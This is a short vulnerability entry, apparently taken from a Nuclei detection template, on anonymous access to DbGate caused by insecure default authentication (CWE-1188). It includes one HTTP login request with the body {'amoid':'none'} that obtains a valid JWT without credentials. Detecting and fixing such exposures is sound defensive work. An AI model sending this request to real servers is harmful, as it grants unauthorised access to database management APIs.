# Vulnerability: DbGate Anonymous Access - Detection
**Classification:** CWE-1188
**Source:** Nuclei Template (`dbgate-anonymous-access.yaml`)

## Description
Detected DbGate instances that allowed anonymous access due to insecure default authentication settings, where unauthenticated users could obtain a valid JWT token and access database management APIs.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /auth/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"amoid":"none"}
```

